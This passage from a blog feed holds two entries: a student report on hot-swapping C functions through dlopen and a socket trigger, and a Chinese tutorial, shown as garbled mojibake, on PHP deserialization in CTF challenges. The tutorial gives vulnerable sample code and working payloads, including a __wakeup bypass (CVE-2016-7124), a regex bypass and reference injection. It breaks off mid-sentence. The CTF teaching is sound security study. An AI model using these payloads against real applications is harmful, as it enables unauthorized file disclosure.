replaced, that is, when the replacement core module is inserted, it is not used by other processes, otherwise the result may cause the phenomenon of inconsistent kernel state.</p><p>(2) The replacement function and the original function have the same parameter list, and the corresponding order of parameter types are the same, the number of parameters is the same, and the function has the same return value. In general, the purpose of replacing a core function is not to change its function, but to track whether the execution flow of the function is abnormal, and whether the variables and parameters have the expected values. Therefore, the replacement function and the original function have the same function.</p><p>To get the address of the function we need to know. We need to customize our own replacement function before we can replace it, and we must be able to find the address of the replacement function in the runtime core (via System.map or /proc/ksyms). In addition, before replacing the function on the target computer, it is best to first pass the test on other nodes with the same hardware platform and operating system core, because the replacement function written by oneself often has some problems and can not pass at one time, so as not to cause unnecessary trouble.</p><p>The purpose or desired effect of dynamically replacing the kernel content is to change the original execution flow of the kernel and to jump to our own custom function flow. As you can see from the schematic of the above function call, there are three places to start with function replacement.</p><p>(1) Modify the stack</p><p>However, this method can only modify the parameters and return address of the function execution, and can not achieve the purpose of changing the execution process;</p><p>(2) Modify the content of the program counter</p><p>There is no way to assign EIP directly within the operating system and no such code is provided.</p><p>(3) modify the original function code</p><p>When a function is called, the value of eip will point to the starting address of the code of the called function, and the value of the next point of eip will be determined based on the first instruction of the function. So we can change the first part of the original function code to jump the contents of the eip to the alternative function code we provide, without leaving the existing stack content unchanged.</p><p>There are two instructions in the instruction set that can jump the execution flow of a program: CALL and JMP.</p><p>Call is a function call instruction. Before a call can be executed, we need to set the parameters of the function on the stack. In this case, because the parameters have been set before entering the original function, we must copy these parameters to the top of the stack. This copying process involves stack addresses related to the number of arguments, so different functions need to be recalculated, more prone to error.</p><p>JMP makes a normal jump (similar to the GOTO statement in C language), and can continue to use the arguments prepared by the original function and the return address information, without having to copy the contents of the stack again, so it is relatively safe and convenient to implement.</p><p><img src="https://www.ibm.com/developerworks/cn/linux/l-knldebug/images/2.gif" alt="img"></p><p>The whole replacement process is completed by a core module. When the core module initializes, it replaces the instruction code at the beginning of the original function func with the jump instruction code, making this part of the code become an instruction to the function replace_func. At the same time to finally be able to restore function func, antiderivatives instruction code of the substituted part must be preserved, so that when we achieve the desired purpose after uninstall the module, can be used to save the order code to cover the original address, so that when the subsequent kernel executive function func again, they can continue to perform the function of the original code, does not destroy the kernel of the state.</p><h5 id="Livepatch"><a href="#Livepatch" class="headerlink" title="-Livepatch"></a>-Livepatch</h5><p>Livepatch is a tool for hotpatching run-time processes. It can easily modify the variables in the running process, but also can easily replace the functions in the running process, using a new library function to replace the original function in the main process.</p><ul><li>  Kernel probesï¼ˆKprobesï¼‰</li><li>  Function tracingï¼ˆFtraceï¼‰</li><li>  Livepatchingï¼ˆlivepatchï¼‰</li></ul><p>And not all the system support this mechanism the supported OS are as followed:</p><ul><li>  Arch Linuxï¼ˆlivepatchï¼Œkpatch-git toolï¼‰</li><li>  Debianï¼ˆDebian 9ï¼‰</li><li>  Gentooï¼ˆ<a href="https://links.jianshu.com/go?to=https://wiki.gentoo.org/wiki/Live_patching">kpatch or ksplice</a>ï¼‰</li><li>  Oracle Linuxï¼ˆkspliceï¼‰</li><li>  RedHat Linux 7ï¼ˆkpatch or kspliceï¼‰</li><li>  SUSEï¼ˆkGraftï¼‰</li><li>  Ubuntu 16.04 or higherï¼ˆlivepatchï¼‰</li></ul><p>If we take this method as a resolution. We will have to consider the following problems.</p><ul><li>  We want to be able to change the behavior of our program while it is running.</li><li>  How new program behavior is dynamically added to process memory. We want to be able to change the behavior of our program while it is running.</li><li>  How to replace the behavior of a function with a new behavior.</li><li>  If the function you need to change is static, can you change it this way?</li><li>  How can a new function call other functions in the original process? How do I access existing global variables? How do I access static functions and static global variables? If the function you need to change is static, can you change it this way?</li></ul><h5 id="Final-Call"><a href="#Final-Call" class="headerlink" title="-Final Call"></a>-Final Call</h5><p>So all of these can be considered as disadvantages of manually replace the ole function with the new one. It is hard and may cause unstableness or other problems that may be unexpected.</p><p>On this condition I think using DLL is the easiest way to solve this. Under Unix OS environment I use dlfcn,h to load and use the external .so file. And by using the Unix system function such as Socket and dlfcn part. All of these are widely used in embedded system.</p><h4 id="Detail"><a href="#Detail" class="headerlink" title="Detail"></a>Detail</h4><p>At the out set of the detail report. I want to make it clear that I achieve the goal of the exercise using DLL(Dynamic Linking Lib) Module and socket communication. The program will dynamically load the function form the specified .so file. The timing of changing the .so file to replace the old function and old .so file is controlled by the socket module. So basically, the program listening on port 9000 for signal of hot fix request, when receive the signal it will try to load the new so file. If nothing goes wrong, the program will go to progressive introduce stage which using the function</p><p><img src="http://106.15.74.181/wp-content/uploads/2021/03/%E5%9B%BE%E7%89%87.png"></p><p>u is a mix value using the old controller function and new controller function which will make the procedure more smooth. As for the error part, the program has its mechanism of error caught part, if the default .so file cannot be loaded the program will go end directly. But if the new .so file fail to load the whole program will use the initial .so file and keep everything unchanged. So in the case of one thread for main situation this program can keep the control algorithm to steadily changed without any error that may result the stop of the control program.</p><pre><code>The function dlopen() loads the dynamic shared object (shared       library) file named by the null-terminated string filename and       returns an opaque &quot;handle&quot; for the loaded object.  This handle is       employed with other functions in the dlopen API, such as       dlsym(3), dladdr(3), dlinfo(3), and dlclose().</code></pre><pre><code>The function dlsym() takes a &quot;handle&quot; of a dynamic loaded shared       object returned by dlopen(3) along with a null-terminated symbol       name, and returns the address where that symbol is loaded into       memory.  If the symbol is not found, in the specified object or       any of the shared objects that were automatically loaded by       dlopen(3) when that object was loaded, dlsym() returns NULL.       (The search performed by dlsym() is breadth first through the       dependency tree of these shared objects.)       In unusual cases (see NOTES) the value of the symbol could       actually be NULL.  Therefore, a NULL return from dlsym() need not       indicate an error.  The correct way to distinguish an error from       a symbol whose value is NULL is to call dlerror(3) to clear any       old error conditions, then call dlsym(), and then call dlerror(3)       again, saving its return value into a variable, and check whether       this saved value is not NULL.</code></pre><pre><code>  socket() creates an endpoint for communication and returns a file       descriptor that refers to that endpoint.  The file descriptor       returned by a successful call will be the lowest-numbered file       descriptor not currently open for the process.       The domain argument specifies a communication domain; this       selects the protocol family which will be used for communication.       These families are defined in &lt;sys/socket.h&gt;.  The formats       currently understood by the Linux kernel include:</code></pre><p>JUST USING THE ON HAND FUNCTION IS ABSOLUTELY BETTER CHOICE</p><p>thatâ€™s why I USE THIS WAY</p><h3 id="Screenshot"><a href="#Screenshot" class="headerlink" title="Screenshot"></a>Screenshot</h3><ul><li>  Default .so loading</li></ul><p><img src="http://106.15.74.181/wp-content/uploads/2021/03/image-20210205160729053-1024x597.png"></p><ul><li>  How to change .so file use <code>nc 127.0.0.1 9000</code> as a signal to contact socket listener</li></ul><p><img src="http://106.15.74.181/wp-content/uploads/2021/03/image-20210205160909274-1024x490.png"></p><ul><li>  .so reload and progressive introduce start</li></ul><p><img src="http://106.15.74.181/wp-content/uploads/2021/03/image-20210205160952768.png"></p><p>The old function keep working and generating output continuously during the reload process</p><p>THE WHOLE PROCESS CAN BE SEEN ABOVE or you you seek deeper <em>JUST CHECK</em> the source code at the out set of the report</p><ul><li>  End of progressive introduce stage</li></ul><p><img src="http://106.15.74.181/wp-content/uploads/2021/03/image-20210205161211343.png"></p><p>You can easily see what happen above , if you seek more just run the program within the whole package plz.</p><p>After that the output will only be generated by the newly replaced function</p><hr><p>é€šè¿‡è¿™æ¬¡å°ä½œä¸šï¼Œå­¦ä¹ äº†dllçš„è½½å…¥ï¼Œcçš„socketç¼–å†™ï¼Œå¹¶å¯¹è¿™ç§åŠ¨æ€æ›¿æ¢ï¼Œçƒ­æ›´æ–°æŠ€æœ¯åšäº†æœ‰é™ä¸”åˆæ­¥çš„äº†è§£</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å¯’å‡çš®æ¡ä¾ ç»™äº†æˆ‘ä¸ªå•å­éœ€æ±‚å¤§æ¦‚æ˜¯è¿™æ ·&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://106.15.74.181/wp-content/uploads/2021/03/Assignment_2020-21-1.pdf&quot;&gt;è‹±æ–‡åŸç‰ˆ&lt;br&gt;Assignment_2020-21-1</summary>
      
    
    
    
    <category term="cè¯­è¨€å­¦ä¹ " scheme="https://zwh-china.github.io/categories/c%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>phpååºåˆ—åŒ–åœ¨CTFä¸­çš„åº”ç”¨</title>
    <link href="https://zwh-china.github.io/2021/03/30/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9C%A8ctf%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    <id>https://zwh-china.github.io/2021/03/30/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9C%A8ctf%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</id>
    <published>2021-03-30T09:27:40.000Z</published>
    <updated>2021-04-20T19:50:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹</p><hr><p>â€‹</p><p>â€‹ <strong>æœ¬æ–‡å‡è®¾è¯»è€…å¯¹äºphpé¢å‘å¯¹è±¡æœ‰ä¸€å®šäº†è§£</strong></p><h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><h4 id="ä»€ä¹ˆæ˜¯ååºåˆ—åŒ–"><a href="#ä»€ä¹ˆæ˜¯ååºåˆ—åŒ–" class="headerlink" title="ä»€ä¹ˆæ˜¯ååºåˆ—åŒ–"></a>ä»€ä¹ˆæ˜¯ååºåˆ—åŒ–</h4><pre><code>åºåˆ—åŒ– (Serialization)æ˜¯å°†å¯¹è±¡çš„çŠ¶æ€ä¿¡æ¯è½¬æ¢ä¸ºå¯ä»¥å­˜å‚¨æˆ–ä¼ è¾“çš„å½¢å¼çš„è¿‡ç¨‹ã€‚åœ¨åºåˆ—åŒ–æœŸé—´ï¼Œå¯¹è±¡å°†å…¶å½“å‰çŠ¶æ€å†™å…¥åˆ°ä¸´æ—¶æˆ–æŒä¹…æ€§å­˜å‚¨åŒºã€‚ä»¥åï¼Œå¯ä»¥é€šè¿‡ä»å­˜å‚¨åŒºä¸­è¯»å–æˆ–ååºåˆ—åŒ–å¯¹è±¡çš„çŠ¶æ€ï¼Œé‡æ–°åˆ›å»ºè¯¥å¯¹è±¡ã€‚</code></pre><p>è¿™ç§å®˜æ–¹è§£é‡Šå¾€å¾€å¯¹åˆå­¦ååºåˆ—åŒ–çš„æœ‹å‹é€ æˆä¸€å®šå›°æ‰°</p><pre><code>åºåˆ—åŒ–çš„å®šä¹‰:åºåˆ—åŒ–ï¼šæŠŠå¯¹è±¡è½¬åŒ–ä¸ºå¯ä¼ è¾“çš„å­—èŠ‚åºåˆ—è¿‡ç¨‹ç§°ä¸ºåºåˆ—åŒ–ã€‚ååºåˆ—åŒ–ï¼šæŠŠå­—èŠ‚åºåˆ—è¿˜åŸä¸ºå¯¹è±¡çš„è¿‡ç¨‹ç§°ä¸ºååºåˆ—åŒ–ã€‚</code></pre><h4 id="ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–ï¼Ÿ"></a>ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–ï¼Ÿ</h4><pre><code>å…¶å®åºåˆ—åŒ–æœ€ç»ˆçš„ç›®çš„æ˜¯ä¸ºäº†å¯¹è±¡å¯ä»¥è·¨å¹³å°å­˜å‚¨ï¼Œå’Œè¿›è¡Œç½‘ç»œä¼ è¾“ã€‚è€Œæˆ‘ä»¬è¿›è¡Œè·¨å¹³å°å­˜å‚¨å’Œç½‘ç»œä¼ è¾“çš„æ–¹å¼å°±æ˜¯IOï¼Œè€Œæˆ‘ä»¬çš„IOæ”¯æŒçš„æ•°æ®æ ¼å¼å°±æ˜¯å­—èŠ‚æ•°ç»„ã€‚å› ä¸ºæˆ‘ä»¬å•æ–¹é¢çš„åªæŠŠå¯¹è±¡è½¬æˆå­—èŠ‚æ•°ç»„è¿˜ä¸è¡Œï¼Œå› ä¸ºæ²¡æœ‰è§„åˆ™çš„å­—èŠ‚æ•°ç»„æˆ‘ä»¬æ˜¯æ²¡åŠæ³•æŠŠå¯¹è±¡çš„æœ¬æ¥é¢ç›®è¿˜åŸå›æ¥çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»åœ¨æŠŠå¯¹è±¡è½¬æˆå­—èŠ‚æ•°ç»„çš„æ—¶å€™å°±åˆ¶å®šä¸€ç§è§„åˆ™ï¼ˆåºåˆ—åŒ–ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä»IOæµé‡Œé¢è¯»å‡ºæ•°æ®çš„æ—¶å€™å†ä»¥è¿™ç§è§„åˆ™æŠŠå¯¹è±¡è¿˜åŸå›æ¥ï¼ˆååºåˆ—åŒ–ï¼‰ã€‚å¦‚æœæˆ‘ä»¬è¦æŠŠä¸€æ ‹æˆ¿å­ä»ä¸€ä¸ªåœ°æ–¹è¿è¾“åˆ°å¦ä¸€ä¸ªåœ°æ–¹å»ï¼Œåºåˆ—åŒ–å°±æ˜¯æˆ‘æŠŠæˆ¿å­æ‹†æˆä¸€ä¸ªä¸ªçš„ç –å—æ”¾åˆ°è½¦å­é‡Œï¼Œç„¶åç•™ä¸‹ä¸€å¼ æˆ¿å­åŸæ¥ç»“æ„çš„å›¾çº¸ï¼Œååºåˆ—åŒ–å°±æ˜¯æˆ‘ä»¬æŠŠæˆ¿å­è¿è¾“åˆ°äº†ç›®çš„åœ°ä»¥åï¼Œæ ¹æ®å›¾çº¸æŠŠä¸€å—å—ç –å¤´è¿˜åŸæˆæˆ¿å­åŸæ¥é¢ç›®çš„è¿‡ç¨‹</code></pre><p>æ‘˜è‡ªçŸ¥å‹-<a href="https://www.zhihu.com/people/duan-pan-ykjym">å‹¤åŠ³çš„å°æ‰‹</a></p><p>å†ç®€å•ç‚¹è¯´å°±æ˜¯ï¼Œå½“ä½ æƒ³æŠŠä¸€ä¸ªæ•°ç»„é€šè¿‡ç½‘ç»œä¼ è¾“åˆ°å¦ä¸€ç«¯å¹¶åœ¨å¦ä¸€ç«¯è¿˜åŸæˆåŸæ•°ç»„ï¼Œä½ å¯ä»¥é€šè¿‡åºåˆ—åŒ–/ååºåˆ—åŒ–çš„æ“ä½œæ¥å®Œæˆã€‚æœ€å¸¸è§çš„jsonä¾¿æ˜¯åºåˆ—åŒ–/ååºåˆ—åŒ–çš„ä»£è¡¨</p><h4 id="php-unserializeå‡½æ•°åŸå‹å’Œå®˜æ–¹å®šä¹‰"><a href="#php-unserializeå‡½æ•°åŸå‹å’Œå®˜æ–¹å®šä¹‰" class="headerlink" title="php unserializeå‡½æ•°åŸå‹å’Œå®˜æ–¹å®šä¹‰"></a>php unserializeå‡½æ•°åŸå‹å’Œå®˜æ–¹å®šä¹‰</h4><pre><code> unserialize ( string $str ) : mixed</code></pre><p>unserializeå‡½æ•°æ¥å—ä¸€ä¸ªstrç±»å‹çš„å‚æ•°ï¼Œè¿”å›ç±»å‹å¯èƒ½æ˜¯å¤šç§ç±»å‹ä¾‹å¦‚æ•°ç»„/å¯¹è±¡</p><h4 id="åºåˆ—åŒ–å­—ç¬¦ä¸²çš„æ ¼å¼"><a href="#åºåˆ—åŒ–å­—ç¬¦ä¸²çš„æ ¼å¼" class="headerlink" title="åºåˆ—åŒ–å­—ç¬¦ä¸²çš„æ ¼å¼"></a>åºåˆ—åŒ–å­—ç¬¦ä¸²çš„æ ¼å¼</h4><p>Type</p><p>Serialization examples</p><p>Null</p><p><code>N;</code></p><p>Boolean</p><p><code>b:1;</code> <code>b:0;</code></p><p>Integer</p><p><code>i:685230;</code> <code>i:-685230;</code></p><p>Floating point</p><p><code>d:685230.15;</code> <code>d:INF;</code> <code>d:-INF;</code> <code>d:NAN;</code></p><p>String</p><p><code>s:6:&quot;A to Z&quot;;</code></p><p>Associative array</p><p><code>a:4:&#123;i:0;b:1;i:1;N;i:2;d:-421000000;i:3;s:6:&quot;A to Z&quot;;&#125;</code> <code>a:2:&#123;i:42;b:1;s:6:&quot;A to Z&quot;;a:3:&#123;i:0;i:1;i:1;i:2;i:2;i:3;&#125;&#125;</code></p><p>Object</p><p><code>O:8:&quot;stdClass&quot;:2:&#123;s:4:&quot;John&quot;;d:3.14;s:4:&quot;Jane&quot;;d:2.718;&#125;</code></p><p>é‚£æˆ‘ä»¬é€‰å–ä¸¤æ­Œæ¯”è¾ƒæœ‰ä»£è¡¨æ€§çš„åºåˆ—åŒ–å­—ç¬¦ä¸²æ¥è¿›è¡Œè§£æ</p><ul><li>  <code>a:4:&#123;i:0;b:1;i:1;N;i:2;d:-421000000;i:3;s:6:&quot;A to Z&quot;;&#125;</code></li></ul><p>è¿™é‡Œçš„<code>a</code>ä»£è¡¨<code>Associative array</code>ä¹Ÿå°±æ˜¯å…³è”å½¢æ•°ç»„ï¼Œ4ä»£è¡¨è¿™ä¸ª åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­åŒ…å«å››ä¸ªå…ƒç´ ï¼Œå†çœ‹èŠ±æ‹¬å·å†…çš„å†…å®¹ï¼Œiè¡¨ç¤ºæ•°ç»„çš„ç´¢å¼•(index)ï¼Œå…¶ä¸­å‡ºç°äº†b N dç­‰å­—æ¯è¿™ä»£è¡¨å…ƒç´ çš„ç±»å‹ï¼Œå‚è€ƒä¸Šè¡¨ï¼Œb:1æ˜¯ä»£è¡¨å¸ƒå°”å€¼Trueï¼ŒNä»£è¡¨NULLï¼Œd:-42100000ä»£è¡¨æµ®ç‚¹æ•°ï¼Œs:â€A to Zâ€ä»£è¡¨å­—ç¬¦ä¸²</p><p><img src="http://106.15.74.181/wp-content/uploads/2021/03/QQ%E5%9B%BE%E7%89%8720210325163315.png"></p><ul><li>  <code>O:8:&quot;stdClass&quot;:2:&#123;s:4:&quot;John&quot;;d:3.14;s:4:&quot;Jane&quot;;d:2.718;&#125;</code></li></ul><p>è¿™é‡ŒOä»£è¡¨<code>Object</code>ä¹Ÿå°±æ˜¯å¯¹è±¡ï¼ŒstdClassæ˜¯ç±»çš„åå­—ï¼Œ8è¡¨ç¤ºç±»åé•¿åº¦ï¼Œ2è¡¨ç¤ºè¿™ä¸ªå¯¹è±¡æœ‰ä¸¤ä¸ªå±æ€§</p><p><img src="http://106.15.74.181/wp-content/uploads/2021/03/QQ%E5%9B%BE%E7%89%8720210325163824-1024x238.png"></p><p>å½“ç„¶ä¸Šé¢çš„è¡¨å¹¶ä¸æ˜¯å®Œæ•´çš„</p><p>Symbol</p><p>Data Type</p><p>Description</p><p>Example</p><p>N</p><p>null</p><p>A NULL value</p><p>N;</p><p>b</p><p>bool</p><p>The value can either be true(1) or false(0)</p><p>b:1;</p><p>i</p><p>int</p><p>Numeric value</p><p>i:1337;</p><p>d</p><p>double</p><p>Double value. Value can be provided as a normal floating value or as E value. (e.g. 1.234E+20). There are three special values: INF -INF NAN</p><p>d:1.337; d:1.3333333E+20</p><p>s</p><p>string</p><p>A serialized string contains the string length and the actual string surrounded by double quotes</p><p>s:4:â€meowâ€;</p><p>S</p><p>encoded string</p><p>The encoded string is very similar to the normal string. The difference is that characters can be hex encoded: A = \41 . This type allows to make the serialized string printable and is very useful in case the server rejects certain characters</p><p>S:5:â€me\00owâ€;</p><p>a</p><p>array</p><p>The array size is defined first. The actual content remains between the {} and must be provided as key value pairs.</p><p>a:1:{i:0;s:5:â€valueâ€;}</p><p>O</p><p>Object</p><p>Objects have the class name at the beginning followed by the property definitions. Similar to arrays key-value pairs are required here. Properties can either be public private or protected. A public property only requires to set the actual property name. For private and static properties some extra information must be prefixed: Following list shows how a property named test is encoded for different visibilities: public: test private: \x00Classname\x00test protected: \x00*\x00test</p><p>O:8:â€stdClassâ€:1:{s:4:â€testâ€;i:123;}</p><p>C</p><p>Custom Object</p><p>Several classes use a custom unserializer and require to use the C symbol. Similar to a normal object the class name is defined first and is followed by the custom serialized string. Contrary to a normal object the number before the custom content defines the length of the custom content instead of the number of properties.</p><p>C:11:â€ArrayObjectâ€:21:{x:i:0;a:0:{};m: a:0:{}}</p><p>r</p><p>reference</p><p>A reference to an existing value in the serialized string.</p><p>r:1;</p><p>R</p><p>reference</p><p>A reference to an existing value in the serialized string. The is_reference attribute of the zval is set</p><p>R:1;</p><p>o</p><p>wtf object</p><p>The purpose of the lowercase o is unclear. It represents an object but it is not possible to set the class name (defaults to stdClass). The misplaced â€œ in the sample is not a typo.</p><p>o:1:â€s:4:â€propâ€;i:1;}</p><h2 id="é‚£åºåˆ—åŒ–åœ¨CTFä¸­æœ‰ä»€ä¹ˆåº”ç”¨å‘¢"><a href="#é‚£åºåˆ—åŒ–åœ¨CTFä¸­æœ‰ä»€ä¹ˆåº”ç”¨å‘¢" class="headerlink" title="é‚£åºåˆ—åŒ–åœ¨CTFä¸­æœ‰ä»€ä¹ˆåº”ç”¨å‘¢"></a>é‚£åºåˆ—åŒ–åœ¨CTFä¸­æœ‰ä»€ä¹ˆåº”ç”¨å‘¢</h2><p>å…ˆçœ‹é¢˜</p><ul><li>  un1</li></ul><pre><code>&lt;!-un1.php--&gt;&lt;?php class SoFun&#123;   protected $file=&#39;index.php&#39;;  function __destruct()&#123;    if(!empty($this-&gt;file)) &#123;      if(strchr($this-&gt; file,&quot;\\&quot;)===false &amp;&amp;  strchr($this-&gt;file, &#39;/&#39;)===false)        show_source(dirname (__FILE__).&#39;/&#39;.$this -&gt;file);      else        die(&#39;Wrong filename.&#39;);    &#125;  &#125;    function __wakeup()&#123;   $this-&gt;file=&#39;index.php&#39;;  &#125; &#125;     if (!isset($_GET[&#39;tryhackme&#39;]))&#123;   show_source(__FILE__);&#125;else&#123;   $a=$_GET[&#39;tryhackme&#39;];   unserialize($a); &#125; ?&gt;&lt;!--key in flag1.php--&gt;</code></pre><p>æ˜¾ç„¶æˆ‘ä»¬éœ€è¦é€šè¿‡ææ„å‡½æ•°çš„<code>show_source</code>å‡½æ•°æ¥æ˜¾ç¤º<code>flag1.php</code> ä½†æ˜¯å…¶ä¸­çš„<code>wakeup</code>é­”æ³•å‡½æ•°ä¼šåœ¨ååºåˆ—åŒ–å¯¹è±¡æ—¶å°†å…¶ä¸­çš„<code>file</code>å±æ€§æ”¹æˆ<code>index.php</code> æ‰€ä»¥è¿™ä¸ªé¢˜çš„éš¾ç‚¹å°±åœ¨äºå¦‚ä½•ç»•è¿‡<code>wakeup</code>å‡½æ•°ã€‚<code>wakeup</code>çš„ç»•è¿‡æ˜¯åˆ©ç”¨ä¿®æ”¹å¯¹è±¡ä¸ªæ•°ç»•è¿‡ï¼Œåœ¨å‰é¢æˆ‘ä»¬è®²äº†åºåˆ—æ¢å­—ç¬¦ä¸²çš„æ¯ä¸ªéƒ¨åˆ†æ„ä¹‰åæˆ‘ä»¬ä¾¿çŸ¥é“å¯¹è±¡ååçš„æ•°å­—ä»£è¡¨åºåˆ—åŒ–å¯¹è±¡ä¸­å…ƒç´ ä¸ªæ•°ï¼Œå½“å…ƒç´ å®é™…ä¸ªæ•°å°äºåºåˆ—åŒ–ä¸²ä¸­æŒ‡å®šä¸ªæ•°æ—¶ï¼Œè¿™ä¸ªåºåˆ—åŒ–ä¸²ä»ä¼šè¢«ååºåˆ—åŒ–ï¼Œä½†æ˜¯å…¶å°†ä¸ä¼šè§¦å‘<code>wakeup</code>å‡½æ•°<code>(CVE-2016-7124 PHP before 5.6.25 and 7.x before 7.0.10)</code></p><p><code>payload:?tryhackme=O:5:&quot;SoFun&quot;:2:&#123;S:7:&quot;\00*\00file&quot;;s:9:&quot;flag1.php&quot;;&#125;</code>æ­¤å¤„\00ä¹Ÿå¯æ¢ä¸º%00</p><ul><li>  un2</li></ul><pre><code> &lt;!-un2.php--&gt; &lt;?phpinclude &quot;flag2.php&quot;; class funny&#123;    function __wakeup()&#123;        global $flag;        echo $flag;    &#125;&#125;if (isset($_GET[&#39;tryhackme&#39;]))&#123;    $a = $_GET[&#39;tryhackme&#39;];    if(preg_match(&#39;/[oc]:\d+:/i&#39;, $a))&#123;        die(&quot;NONONO!&quot;);    &#125; else &#123;        unserialize($a);    &#125;&#125; else &#123;    show_source(__FILE__);&#125; ?&gt; </code></pre><p>è¿™é“é¢˜ä¸»è¦æ˜¯åºåˆ—åŒ–å­—ç¬¦ä¸²çš„ç‰¹æ®Šæ„é€ æ¥ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…ã€‚å¸¸è§å¯ä»¥é€šè¿‡ä½¿ç”¨+å·æ¥è¿›è¡Œç»•è¿‡(æ³¨æ„æ­¤å¤„+åº”é‡‡ç”¨urlç¼–ç %2bæ¥é˜²æ­¢è¢«é»˜è®¤è§£æä¸ºç©ºæ ¼)</p><p><code>payload:?tryhackme=O:%2b5:&quot;funny&quot;:0:&#123;&#125;</code></p><ul><li>  un3</li></ul><pre><code> &lt;!-un3.php--&gt;&lt;?phpinclude &quot;flag3.php&quot;; class funny&#123;    private $password;    public $verify;    function __wakeup()&#123;        global $nobodyknow;        global $flag;        $this-&gt;password = $nobodyknow;        if ($this-&gt;password === $this-&gt;verify)&#123;            echo $flag;        &#125; else &#123;            echo &quot;Hacking??!&quot;;        &#125;    &#125;&#125;if (isset($_GET[&#39;tryhackme&#39;]))&#123;$a = $_GET[&#39;tryhackme&#39;];unserialize($a);&#125; else &#123;    show_source(__FILE__);&#125;?&gt;</code></pre><p>å¯ä»¥çœ‹åˆ°æƒ³è¦æ‹¿flagå°±å¿…é¡»é€šè¿‡<code>wakeup</code>å‡½æ•°ï¼Œæ­¤å¤„è€ƒç‚¹æ˜¾ç„¶ä¸å†æ˜¯<code>wakeup</code>å‡½æ•°çš„ç»•è¿‡ã€‚å¯ä»¥çœ‹åˆ°<code>nobodyknow</code>è¿™ä¸ªå˜é‡æˆ‘ä»¬æ˜¯ä¸å¯æ§çš„ã€‚ä½†æ˜¯æƒ³è¦æ‹¿åˆ°flagæˆ‘ä»¬å¿…é¡»è®©verifyè¿™ä¸ªå˜é‡ç­‰äº<code>nobodyknow</code>è¿™æ—¶æˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨å¼•ç”¨ï¼Œè®©verifyçš„å€¼ä¸ºå¯¹passwordçš„å¼•ç”¨è¿™æ ·ä¸¤ä¸ªå˜é‡çš„å€¼å°±æ’å®šç›¸ç­‰äº†</p><p><code>payload:?tryhackme=O:5:&quot;funny&quot;:2:&#123;s:15:&quot;%00funny%00password&quot;;N;s:6:&quot;verify&quot;;R:2;&#125;</code></p><ul><li>  un4</li></ul><pre><code> &lt;!-un4.php--&gt; &lt;?php// goto un42.phpini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);session_start();if (isset($_GET[&#39;tryhackme&#39;]))&#123;$_SESSION[&#39;tryhackme&#39;] = $_GET[&#39;tryhackme&#39;];&#125; else &#123;show_source(__FILE__);&#125;?&gt; </code></pre><pre><code> &lt;!-un42.php--&gt; &lt;?phpinclude &quot;flag4.php&quot;; ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;);session_start();class funny&#123;    public $a;    function __destruct()&#123;        global $flag;        echo $flag;    &#125;&#125;show_source(__FILE__);?&gt; </code></pre><p>è¿™ä¸ªé¢˜åº”ç”¨äº†phpååºåˆ—åŒ–å¼•æ“ä½¿ç”¨ä¸ä¸€è‡´å¯¼è‡´çš„æ¼æ´ï¼Œå¯ä»¥æ³¨æ„åˆ°ä¸¤ä¸ªphpé¡µé¢ä½¿ç”¨çš„ååºåˆ—åŒ–å¼•æ“æ˜¯ä¸åŒçš„ï¼Œå‰è€…ç”¨çš„æ˜¯<code>php_serialize</code>åè€…åˆ™æ˜¯<code>php</code>å…·ä½“çš„æ¼æ´åˆ©ç”¨å°±æ˜¯é€šè¿‡æ„é€ payloadï¼Œä½¿å¾—sessionåœ¨è¢«ååºåˆ—åå¾—åˆ°ç±»funnyã€‚å…·ä½“å¯ä»¥å‚è€ƒSpoockçš„blog<code>https://blog.spoock.com/2016/10/16/php-serialize-problem/</code></p><p>å…·ä½“åˆ°è¿™é¢˜çš„<code>payload:?tryhackme=O:5:&quot;funny&quot;:1:&#123;s:1:&quot;a&quot;;N;&#125;</code></p><ul><li>  un5</li></ul><pre><code> &lt;!-un5.php--&gt; &lt;?phpinclude &quot;flag5.php&quot;;class funny&#123;    private $a;    function __construct() &#123;        $this-&gt;a = &quot;givemeflag&quot;;    &#125;    function __destruct() &#123;        global $flag;        if ($this-&gt;a === &quot;givemeflag&quot;) &#123;            echo $flag;        &#125;    &#125;&#125;if (isset($_GET[&#39;tryhackme&#39;]) &amp;&amp; is_string($_GET[&#39;tryhackme&#39;]))&#123;$a = $_GET[&#39;tryhackme&#39;];for($i=0;$i&lt;strlen($a);$i++)&#123;    if (ord($a[$i]) &lt; 32  ord($a[$i]) &gt; 126) &#123;        die(&quot;hacker!&quot;);    &#125;&#125;unserialize($a);&#125; else &#123;    show_source(__FILE__);&#125;?&gt; </code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œé¢˜ç›®å¯¹ååºåˆ—åŒ–å­—ç¬¦ä¸²çš„å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ä¸å…è®¸ååºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­å­˜åœ¨ä¸å¯è§å­—ç¬¦ã€‚ä½†æ˜¯ç”±äºç±»ä¸­çš„$aæ˜¯privateå±æ€§ã€‚æ‰€ä»¥åœ¨æ„é€ 